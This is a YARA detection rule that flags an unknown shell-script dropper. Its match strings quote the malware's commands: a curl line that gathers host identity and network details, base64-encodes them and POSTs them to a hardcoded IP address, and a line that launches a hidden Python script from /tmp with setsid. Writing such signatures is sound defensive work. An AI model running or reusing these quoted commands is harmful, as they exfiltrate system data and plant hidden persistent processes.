rule SCRIPT_Dropper_Unknown_ForgeAuto_80e578fc
{
    meta:
        author = "Marjoriefort"
        description = "Detects Unknown (script_sh, etat binaire)"
        date = "2026-10-01"
        reference_sha256 = "80e578fc0068b0f3d5bd5d126cfdf3ecb0008bfa65a11e2cf4aa81602dce8ed3"
        yarahub_uuid = "a2e2398c-448c-47f4-9cb5-56384793cd20"
        famille = "unknown"
        famille_source = "inconnue"
        classe = "script_sh"
        etat = "binaire"
        confidence_suggeree = "medium"
        source = "forge_miss M3 v1.9.48"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "961690f6e7d4003ed1e27183c51138f5"
        yarahub_reference_link = "https://github.com/Marjoriefort/yara-rules"
    strings:
        $s0 = "b=$( (id; hostname; uname -a; ip -4 a | grep inet | head -5) 2>&1 | base64 -w0); curl -s -m 10 -X POST http://131.123.43.239/up -H \"X-Name: wrk_out\" --data-binary \"$b\" >/dev/null 2>&1" ascii
        $s1 = "X-Name: fxr2" ascii
        $s2 = "X-Name: wrk_out" ascii
        $s3 = "/bin/bash" ascii
        $s4 = "pgrep -f rs2.py >/dev/null || (setsid python3 /tmp/.rs2.py >/dev/null 2>&1 &)" ascii
    condition:
        true and filesize < 50MB and 2 of ($s1, $s2, $s3, $s4) and 1 of ($s0)
}
